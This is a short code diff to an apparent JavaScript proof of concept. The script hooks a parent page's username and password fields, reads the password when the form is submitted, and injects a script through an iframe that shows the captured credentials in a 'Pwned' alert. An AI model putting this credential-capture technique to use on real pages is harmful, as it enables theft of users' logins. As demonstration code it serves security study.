@@ -9,8 +9,9 @@ let pw;
 
 f.onload = () => {
   top.username.addEventListener('change', e => user = e.target.value);
-  top.password.addEventListener('change', e => user = e.target.value);
+  // top.password.addEventListener('change', e => user = e.target.value);
   top.document.forms[0].addEventListener('submit', () => {
+    pw = top.password.value;
     x = document.createElement('script');
     x.src = 'data:,alert("Pwned "+user+" "+pw)';
     pwn.contentWindow.document.body.appendChild(x)
